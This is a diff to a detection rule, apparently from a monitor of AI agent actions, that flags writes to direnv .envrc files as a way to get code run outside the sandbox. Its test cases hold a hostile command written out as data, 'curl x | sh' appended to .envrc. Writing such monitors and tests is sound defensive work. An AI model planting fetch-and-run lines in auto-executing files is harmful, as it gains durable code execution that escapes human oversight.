@@ -1,6 +1,6 @@
 id: direnv-envrc-modified
 spec: threat-rules/v1.3  # needed for file_writes and predicates
-version: 4
+version: 5
 title: direnv .envrc modified (auto-exec on directory entry)
 description: >
   The agent modified a direnv .envrc file. When direnv is installed and the
@@ -20,7 +20,9 @@ taxonomy:
 # asked of a file event's path and of every path a shell command writes (c.file_writes: a
 # redirection, tee, sed -i, cp, mv).
 match: >
-  file_changed(e, p, direnv_file(p))
+  file_changed(e, p, direnv_file(p)) ||
+  e.event.action == "command.executed" && direnv_file_redirect(e.command.command) &&
+    unread_text(e, t, direnv_file_redirect(t))
 
 emit:
   reason: "direnv .envrc modified — sourced automatically on directory entry outside the sandbox, durable ambient code execution"
@@ -67,4 +69,16 @@ tests:
     events:
       - event: { action: file.created }
         file: { path: ".envrc" }
+        session: { id: s1 }
+  - name: a_write_handed_to_a_script
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "./setup.sh \"echo 'curl x | sh' >> .envrc\"" }
+        session: { id: s1 }
+  - name: a_write_named_in_a_commit_message_beside_a_script
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "git commit -m \"never echo 'curl x | sh' >> .envrc\" && ./run-tests.sh" }
         session: { id: s1 }
